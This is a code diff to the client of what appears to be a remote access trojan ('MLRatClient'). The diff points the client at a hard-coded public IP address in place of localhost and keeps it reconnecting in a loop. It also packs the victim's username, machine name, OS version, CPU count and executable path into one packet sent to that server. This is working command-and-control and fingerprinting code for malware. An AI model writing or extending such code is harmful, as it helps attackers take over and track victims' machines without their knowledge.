@@ -46,7 +46,8 @@ namespace MLRatClient
             networkClient.OnDataRetrieved += networkClient_OnDataRetrieved;
             networkClient.OnDisconnect += networkClient_OnDisconnect;
             networkClient.OnConnect += NetworkClient_OnConnect;
-            networkClient.ConnectAsync("127.0.0.1", 12345);
+            //networkClient.ConnectAsync("127.0.0.1", 12345);
+            networkClient.ConnectAsync("45.55.136.217", 12345);
         }
 
         private static void NetworkClient_OnConnect(eSock.Client sender, bool success)
@@ -180,6 +181,7 @@ namespace MLRatClient
                     DisplayException(_plugin, ex);
                 }
             }
+            Console.WriteLine("Lost connection...");
             Thread.Sleep(5000);
             Connect();
         }
@@ -238,10 +240,14 @@ namespace MLRatClient
 
                     if(command == NetworkPacket.PluginsVerified)
                     {
-                        networkClient.SendWait(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "Username", string.Format("{0}/{1}", Environment.UserName, Environment.MachineName));
-                        networkClient.SendWait(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "OS", Environment.OSVersion.ToString());
-                        networkClient.SendWait(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "Cores", Environment.ProcessorCount.ToString());
-                        networkClient.SendWait(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "Path", Assembly.GetExecutingAssembly().Location);
+                        Dictionary<string, object> Settings = new Dictionary<string, object>()
+                        {
+                            {"Username", string.Format("{0}/{1}", Environment.UserName, Environment.MachineName)},
+                            {"OS", Environment.OSVersion.ToString() },
+                            {"Cores", Environment.ProcessorCount.ToString() },
+                            {"Path", Assembly.GetExecutingAssembly().Location }
+                        };
+                        networkClient.SendWait(Guid.Empty, (byte)NetworkPacket.UpdateSettingsDictionary, Settings);
                         networkClient.SendWait(Guid.Empty, (byte)NetworkPacket.BasicSettingsUpdated);
                     }
 
